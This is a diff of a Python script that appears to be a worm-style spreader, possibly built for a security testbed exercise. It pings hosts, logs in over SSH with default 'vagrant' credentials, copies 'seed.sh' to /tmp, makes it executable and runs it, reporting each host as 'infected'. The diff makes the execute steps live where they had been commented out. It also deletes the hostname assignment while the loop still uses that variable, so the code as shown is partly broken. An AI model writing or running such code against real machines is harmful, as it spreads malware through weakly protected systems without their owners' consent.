@@ -2,9 +2,10 @@
 import os
 import paramiko
 import sys
+import time
 def run(**args):
     fileName = "seed.sh"
-    myList = []
+    myList = ['localhost']
     # Function to ping and find all hosts on a network
     def pinger(hostname):
         response = os.system("ping -c 1 " + hostname)
@@ -19,7 +20,6 @@ def run(**args):
     #   For DETER need to change to local address!!!!
     #   Change range to (255)
     for i in range(120,121,1):
-        hostname = 'localhost'  # For testing
         res = pinger(hostname) #+ str(i))
         if res == 1:
             myList.append(hostname ) #+ str(i))
@@ -30,12 +30,13 @@ def run(**args):
         try:
             ssh.connect(ipAddr, username="vagrant", password="vagrant")
             sftpClient = ssh.open_sftp()
-            sftpClient.put("../" + fileName, "/tmp/" + fileName)
-            #ssh.exec_command("chmod +x /tmp/" + fileName)
+            test = sftpClient.put("../" + fileName, "/tmp/" + fileName)
+            test = ssh.exec_command("chmod +x /tmp/" + fileName)
             print "[+] " + ipAddr + " infected."
-            #ssh.exec_command("./tmp/" +fileName)
-            #ssh.exec_command("\n")
+            stdin,stdout,stderr = ssh.exec_command("/tmp/" +fileName)
+            print "stderr: ", stderr.readlines()
+            ssh.exec_command("\n")
         except paramiko.AuthenticationException:
             print "[-] Failed! ..."
 
-    return "str(myList)"
+    return None
